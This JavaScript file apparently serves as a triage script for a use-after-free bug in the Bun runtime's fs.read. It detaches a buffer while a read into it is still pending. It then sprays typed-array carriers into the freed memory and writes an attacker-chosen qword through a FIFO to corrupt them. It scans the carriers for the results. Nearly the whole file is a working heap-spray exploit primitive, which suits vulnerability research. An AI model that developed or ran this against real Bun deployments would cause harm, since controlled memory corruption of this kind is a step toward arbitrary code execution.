// Bounded triage for the non-canonical 96-byte and 128-byte fs.read
// BufferSource reclaim crashes.
//
// This intentionally avoids bun:ffi and native helper dylibs. It writes a
// caller-supplied byte/qword payload into a detached BufferSource's reclaimed
// storage, sprays small JSC/ArrayBuffer carrier shapes, and then touches the
// retained carriers just enough to classify JS-visible corruption before any
// native crash fires.

import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const iterations = Number(process.env.ITERATIONS || 24);
const uafSize = Number(process.env.UAF_SIZE || 96);
const viewSize = Number(process.env.VIEW_SIZE || 128);
const sprayCount = Number(process.env.SPRAY_COUNT || 8192);
const sprayKind = process.env.SPRAY_KIND || "u8";
const writeOffset = Number(process.env.WRITE_OFFSET || 16);
const writeLength = Number(process.env.WRITE_LENGTH || 8);
const payloadMode = process.env.PAYLOAD_MODE || "u64";
const payloadQword = BigInt(process.env.PAYLOAD_QWORD || "0x4141414142424242");
const payloadByte = Number(process.env.PAYLOAD_BYTE || 0x43) & 0xff;
const detachMode = process.env.DETACH_MODE || "transfer";
const releaseAfterRead = process.env.RELEASE_AFTER_READ === "1";
const maxAnomalies = Number(process.env.MAX_ANOMALIES || 8);
const touchAnomalies = process.env.TOUCH_ANOMALIES !== "0";
const path = join(tmpdir(), `bun-reclaim-96-128-triage-${process.pid}`);
const retained = [];

if (writeOffset < 0 || writeLength <= 0 || writeOffset + writeLength > uafSize) {
  throw new Error("WRITE_OFFSET/WRITE_LENGTH must fit inside UAF_SIZE");
}

const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);
const fd = fs.openSync(path, fs.constants.O_RDWR);

function detach(ab) {
  if (detachMode === "clone") {
    structuredClone({}, { transfer: [ab] });
    return;
  }

  if (detachMode === "transfer-same" && typeof ab.transfer === "function") {
    ab.transfer(ab.byteLength);
    return;
  }

  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function hex(value, width = 16) {
  return `0x${value.toString(16).padStart(width, "0")}`;
}

function writeU64LE(out, offset, value) {
  let v = BigInt(value);
  for (let i = 0; i < 8 && offset + i < out.length; i++) {
    out[offset + i] = Number(v & 0xffn);
    v >>= 8n;
  }
}

function makePayload() {
  const payload = Buffer.alloc(writeLength, 0);
  if (payloadMode === "byte") {
    payload.fill(payloadByte);
    return payload;
  }

  if (payloadMode === "u32-pair") {
    const low = Number(payloadQword & 0xffffffffn);
    payload.writeUInt32LE(low >>> 0, 0);
    if (writeLength >= 8) payload.writeUInt32LE(low >>> 0, 4);
    return payload;
  }

  if (payloadMode !== "u64") {
    throw new Error("PAYLOAD_MODE must be u64, u32-pair, or byte");
  }

  writeU64LE(payload, 0, payloadQword);
  return payload;
}

function fillBytes(bytes, fill) {
  for (let i = 0; i < bytes.byteLength; i++) bytes[i] = fill;
}

function makeCarrier(index) {
  const fill = (0x71 + (index & 15)) & 0xff;
  switch (sprayKind) {
    case "arraybuffer": {
      const ab = new ArrayBuffer(viewSize);
      fillBytes(new Uint8Array(ab), fill);
      return ab;
    }
    case "u8": {
      const view = new Uint8Array(new ArrayBuffer(viewSize));
      view.fill(fill);
      return view;
    }
    case "u8-offset": {
      const ab = new ArrayBuffer(viewSize + 16);
      const view = new Uint8Array(ab, 16, viewSize);
      view.fill(fill);
      return view;
    }
    case "dataview": {
      const ab = new ArrayBuffer(viewSize);
      fillBytes(new Uint8Array(ab), fill);
      return new DataView(ab);
    }
    case "float64Array": {
      const view = new Float64Array(Math.max(1, Math.trunc(viewSize / 8)));
      for (let i = 0; i < view.length; i++) view[i] = index + i / 1024;
      return view;
    }
    case "biguint64Array": {
      const view = new BigUint64Array(Math.max(1, Math.trunc(viewSize / 8)));
      for (let i = 0; i < view.length; i++) view[i] = BigInt(index) << 16n | BigInt(i);
      return view;
    }
    case "rab-u8": {
      const ab = new ArrayBuffer(viewSize, { maxByteLength: viewSize * 2 });
      const view = new Uint8Array(ab);
      view.fill(fill);
      return view;
    }
    default:
      throw new Error("SPRAY_KIND must be arraybuffer, u8, u8-offset, dataview, float64Array, biguint64Array, or rab-u8");
  }
}

function allocateCarriers() {
  retained.length = 0;
  for (let i = 0; i < sprayCount; i++) retained.push(makeCarrier(i));
}

function expectedFirst(index) {
  return (0x71 + (index & 15)) & 0xff;
}

function carrierBytes(carrier) {
  if (carrier instanceof ArrayBuffer) return new Uint8Array(carrier);
  if (carrier instanceof DataView) return new Uint8Array(carrier.buffer, carrier.byteOffset, carrier.byteLength);
  if (ArrayBuffer.isView(carrier)) return new Uint8Array(carrier.buffer, carrier.byteOffset, carrier.byteLength);
  return null;
}

function readField(fn) {
  try {
    return fn();
  } catch (error) {
    return `threw:${error?.message || String(error)}`;
  }
}

function summarizeCarrier(carrier, index) {
  const bytes = carrierBytes(carrier);
  const expected = expectedFirst(index);
  const summary = {
    index,
    kind: sprayKind,
    byteLength: readField(() => carrier.byteLength),
    length: readField(() => carrier.length),
    bufferByteLength: readField(() => carrier.buffer?.byteLength ?? carrier.byteLength),
    first: readField(() => bytes?.[0]),
    last: readField(() => bytes?.[bytes.byteLength - 1]),
  };

  const scalarFillCarrier =
    sprayKind === "arraybuffer" ||
    sprayKind === "u8" ||
    sprayKind === "u8-offset" ||
    sprayKind === "dataview" ||
    sprayKind === "rab-u8";
  const changed =
    scalarFillCarrier &&
    (summary.first !== expected || summary.last !== expected);

  if (!changed) return null;

  if (touchAnomalies && bytes) {
    summary.touchBefore = readField(() => bytes[0]);
    summary.touchWrite = readField(() => {
      bytes[0] = 0x5a;
      return bytes[0];
    });
  }
  return summary;
}

function scanAnomalies() {
  const anomalies = [];
  for (let i = 0; i < retained.length; i++) {
    const anomaly = summarizeCarrier(retained[i], i);
    if (!anomaly) continue;
    anomalies.push(anomaly);
    if (anomalies.length >= maxAnomalies) break;
  }
  return anomalies;
}

async function runOne(iteration) {
  const payload = makePayload();
  const ab = new ArrayBuffer(uafSize);
  const target = new Uint8Array(ab);
  target.fill(0x51);

  const done = new Promise(resolve => {
    fs.read(fd, target, writeOffset, payload.length, null, (err, bytesRead) => {
      resolve({ err, bytesRead });
    });
  });

  detach(ab);
  gcNow();
  allocateCarriers();
  gcNow();

  fs.writeSync(fd, payload, 0, payload.length);
  const result = await done;
  const anomalies = scanAnomalies();

  console.log(JSON.stringify({
    iteration,
    uafSize,
    viewSize,
    sprayCount,
    sprayKind,
    detachMode,
    writeOffset,
    writeLength: payload.length,
    payloadMode,
    payloadQword: payloadMode === "byte" ? undefined : hex(payloadQword),
    payloadByte: payloadMode === "byte" ? hex(BigInt(payloadByte), 2) : undefined,
    releaseAfterRead,
    touchAnomalies,
    bytesRead: result.bytesRead,
    err: result.err?.message,
    anomalies,
  }));

  if (releaseAfterRead) {
    retained.length = 0;
    gcNow();
  }
}

try {
  for (let i = 1; i <= iterations; i++) await runOne(i);
  console.log(JSON.stringify({
    final: true,
    iterations,
    uafSize,
    viewSize,
    sprayCount,
    sprayKind,
    writeOffset,
    writeLength,
    payloadMode,
    payloadQword: payloadMode === "byte" ? undefined : hex(payloadQword),
    payloadByte: payloadMode === "byte" ? hex(BigInt(payloadByte), 2) : undefined,
  }));
  process.exitCode = 0;
} finally {
  fs.closeSync(fd);
  fs.unlinkSync(path);
}
